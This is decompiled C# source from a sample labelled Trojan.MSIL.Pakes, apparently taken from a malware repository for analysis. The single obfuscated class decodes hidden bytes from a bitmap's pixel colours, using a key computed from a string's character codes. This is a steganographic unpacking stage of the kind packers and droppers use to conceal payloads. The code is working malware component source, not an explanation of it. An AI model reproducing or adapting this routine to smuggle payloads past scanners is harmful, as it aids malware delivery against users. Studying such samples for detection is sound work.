// Decompiled with JetBrains decompiler
// Type: èóÒÒÆsÝnËÓPÛ8ÏT9DÚÖïàsaáf
// Assembly: udpate4crypt, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 541DEA59-E19A-477D-AB3D-3DB3AA857568
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.Pakes.ap-f4471ee56906b80e4b69c7226be029e97a72b82baf0a9ad0f294d21342e36f9a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Drawing;

public class èóÒÒÆsÝnËÓPÛ8ÏT9DÚÖïàsaáf
{
  public static byte[] ÏlìAhígr8ÁBÌðæbÐèØÇÀöe7Ïï(
    Bitmap Ð8FUXkÎðcô7ïcUäìZ0EHvQñlT,
    string öÞÜVnbeRPÛåQMäGwÛÉïTàÁtâÑ)
  {
    byte[] numArray;
    try
    {
      List<byte> byteList = new List<byte>();
      string str = öÞÜVnbeRPÛåQMäGwÛÉïTàÁtâÑ;
      int index = 0;
      int length = str.Length;
      int num1;
      while (index < length)
      {
        char String = str[index];
        checked { num1 += Strings.Asc(String); }
        checked { ++index; }
      }
      int num2 = checked (Ð8FUXkÎðcô7ïcUäìZ0EHvQñlT.Width - 1);
      int x = 0;
      while (x <= num2)
      {
        int num3 = checked (Ð8FUXkÎðcô7ïcUäìZ0EHvQñlT.Height - 1);
        int y = 0;
        while (y <= num3)
        {
          Color color = Ð8FUXkÎðcô7ïcUäìZ0EHvQñlT.GetPixel(x, y);
          int r = (int) color.R;
          int g = (int) color.G;
          int b = (int) color.B;
          int num4 = 0;
          int num5 = r % (int) byte.MaxValue;
          int num6 = checked (b - unchecked (checked (unchecked (num5 % (int) byte.MaxValue) + g) % (int) byte.MaxValue / 3));
          int num7 = checked (num5 + (int) byte.MaxValue * num6) ^ num1;
          if (num7 != 47)
            byteList.Add(checked ((byte) (num7 - (int) byte.MaxValue)));
          color = new Color();
          num4 = 0;
          checked { ++y; }
        }
        checked { ++x; }
      }
      numArray = byteList.ToArray();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return numArray;
  }
}
